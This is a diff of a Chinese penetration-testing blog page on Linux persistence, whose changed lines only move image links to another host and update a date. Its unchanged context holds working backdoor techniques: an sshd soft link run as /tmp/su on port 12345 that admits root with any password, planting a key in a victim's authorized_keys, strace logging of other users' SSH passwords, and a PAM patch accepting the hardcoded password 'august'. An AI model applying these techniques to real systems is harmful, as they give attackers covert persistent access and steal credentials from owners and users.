@@ -23,16 +23,16 @@
 <meta property="og:site_name" content="AU9U5T">
 <meta property="og:description" content="SSH后门软链接12ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345  # -oport 的意思是监听端口ssh root@192.168.78.19 -p 1234su   输入任意密码就可以 root 用户权限登陆，如果 root 用户被禁止登陆时，可以利用其他存在的用户身份登陆   Linux的一个后门引发对PAM的探究 - 番茄汁汁 -">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216161709771.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216163648231.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216164543289.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216170339632.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216161709771.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216163648231.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216164543289.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216170339632.png">
 <meta property="article:published_time" content="2024-02-16T07:54:20.000Z">
-<meta property="article:modified_time" content="2024-03-28T11:20:52.086Z">
+<meta property="article:modified_time" content="2025-06-01T09:42:24.459Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216161709771.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216161709771.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -295,7 +295,7 @@
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/likaiming/p/11007919.html">Linux的一个后门引发对PAM的探究 - 番茄汁汁 - 博客园 (cnblogs.com)</a></p>
 </blockquote>
 <p>该方式可以实现免密的登录</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216161709771.png" srcset="/img/loading.gif" lazyload alt="image-20240216161709771"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216161709771.png" srcset="/img/loading.gif" lazyload alt="image-20240216161709771"></p>
 <p>发现这这个su 的help 是sshd的，因为我们使用的软链接</p>
 <p>然后我们的主机就可以使用ssh 任意密码就可以实现登录了</p>
 <h2 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h2><ol>
@@ -304,7 +304,7 @@
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure>
 
 <p>  把公钥id_rsa.pub发送到目标authorized_keys文件中  </p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216163648231.png" srcset="/img/loading.gif" lazyload alt="image-20240216163648231"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216163648231.png" srcset="/img/loading.gif" lazyload alt="image-20240216163648231"></p>
 <p>可以先将这个临时放入一个文件，然后将这个文件上传到受害者的机器上，然后将内容导入到authorized_keys</p>
 <p>注意是添加 </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls <span class="hljs-regexp">/root/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
@@ -330,7 +330,7 @@
 <p>strace 常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设  备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至  内核态模式，通过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返  回值，执行消耗的时间。  </p>
 <p>SSH连接输入密码时的密码无论错误或者正确都能记录到log里。</p>
 <p>然后访问这个文件</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216164543289.png" srcset="/img/loading.gif" lazyload alt="image-20240216164543289"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216164543289.png" srcset="/img/loading.gif" lazyload alt="image-20240216164543289"></p>
 <p>就可以发现其他人的输入的密码</p>
 <h1 id="Linux-PAM-后门"><a href="#Linux-PAM-后门" class="headerlink" title="Linux PAM 后门"></a>Linux PAM 后门</h1><p>PAM这个模块用于检测ssh 登录时，用于检测密码是否正确</p>
 <p>我们可以在PAM 安装后门 </p>
@@ -343,7 +343,7 @@
 
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">:<span class="hljs-keyword">set</span> <span class="hljs-built_in">number</span><br><span class="hljs-number">181</span>G<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216170339632.png" srcset="/img/loading.gif" lazyload alt="image-20240216170339632"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216170339632.png" srcset="/img/loading.gif" lazyload alt="image-20240216170339632"></p>
 <p>添加内容</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;august&quot;</span>,p)==<span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> PAM_SUCCESS;&#125;<br></code></pre></td></tr></table></figure>
 
